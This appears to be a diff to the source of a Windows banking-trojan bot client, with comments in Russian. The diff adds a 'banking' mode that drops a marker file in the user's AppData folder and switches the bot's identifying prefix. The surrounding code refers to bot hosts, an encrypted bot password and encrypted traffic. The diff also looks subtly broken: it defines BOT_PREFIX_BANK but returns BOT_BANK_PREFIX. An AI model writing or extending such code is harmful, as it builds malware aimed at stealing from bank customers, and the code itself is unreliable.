@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <shlobj.h>
 
 #include "Config.h"
 #include "GetApi.h"
@@ -8,6 +9,7 @@
 #include "Crypt.h"
 #include "BotHosts.h"
 #include "BotClasses.h"
+
 
 #include "Modules.h"
 
@@ -56,6 +58,11 @@ namespace CONFIGDEBUGSTRINGS
 	//----------------------------------------------------------------------------
 	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "BOT_UID\0";
 
+	//----------------------------------------------------------------------------
+	// Префикс бота работающего в режиме Банк
+	//----------------------------------------------------------------------------
+	char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
+
 
 	//----------------------------------------------------------------------------
 	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
@@ -66,6 +73,7 @@ namespace CONFIGDEBUGSTRINGS
 
 //=============================================================================
 #endif
+
 
 //----------------------------------------------------------------------------
 // Стандартный пароль, будет использоваться только в случаях
@@ -128,12 +136,53 @@ const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".r
 
 
 
+string GetBankingModeFileName()
+{
+	// Функция возвращает имя сигнального файла
+	// для банковского префикса
+
+	string Path(MAX_PATH);
+	if (!SHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
+		return NULLSTR;
+    Path.CalcLength();
+
+    Path += "\\";
+	Path += BANKING_SIGNAL_FILE;
+
+	return Path;
+}
+//-----------------------------------------------------------------------------
+
+void SetBankingMode()
+{
+	string FileName = GetBankingModeFileName();
+	if (!FileName.IsEmpty())
+		File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
+}
+//-----------------------------------------------------------------------------
+
+bool IsBankingMode()
+{
+	// Функция возвращает истину если включен режим "Банк"
+	// В этом режиме настройки бота могут отличаться от обычных
+
+	string FileName = GetBankingModeFileName();
+	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
+}
+//-----------------------------------------------------------------------------
+
+
 char *GetPrefix()
 {
 	// Функция возвращает префикс бота
+
 	#ifdef DEBUGCONFIG
 		return DebugBotPrefix;
 	#else
+		// Проверяем режим режим работы
+		if (IsBankingMode())
+			return BOT_BANK_PREFIX;
+
 		return  Decrypt(BOT_PREFIX);
 	#endif
 }
